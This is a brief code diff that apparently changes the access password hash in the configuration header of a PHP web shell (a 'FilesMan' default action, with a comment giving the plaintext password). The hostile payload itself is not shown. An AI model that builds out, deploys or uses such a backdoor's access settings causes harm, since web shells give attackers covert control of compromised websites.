@@ -11,7 +11,7 @@ session_start();
 
 /* Configuration */
 /* Password using md5 hashes */
-$password = "d197f4456d397b31383235633609e7a7"; //ysfislmy
+$password = "7ff9e9e716e71e02c30d166f5794cc04"; //ysfislmy
 $default_action = "FilesMan";
 $default_use_ajax = true;
 $default_charset = 'UTF-8';
